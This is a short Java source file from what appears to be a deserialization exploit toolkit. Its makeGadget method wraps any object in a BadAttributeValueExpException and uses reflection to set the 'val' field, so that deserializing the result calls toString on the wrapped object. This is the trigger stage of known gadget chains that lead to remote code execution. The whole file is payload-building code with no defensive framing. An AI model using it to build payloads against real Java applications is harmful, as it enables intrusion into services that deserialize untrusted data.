import javax.management.BadAttributeValueExpException;


public class BadAttrValExeNode{

    public static Object makeGadget(Object obj) throws Exception {
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException (null);
        Reflections.setFieldValue(badAttributeValueExpException, "val", obj);
        Reflections.setFieldValue(badAttributeValueExpException, "stackTrace", new StackTraceElement[0]);
        Reflections.setFieldValue(badAttributeValueExpException, "cause", null);
        return badAttributeValueExpException;
    }
}
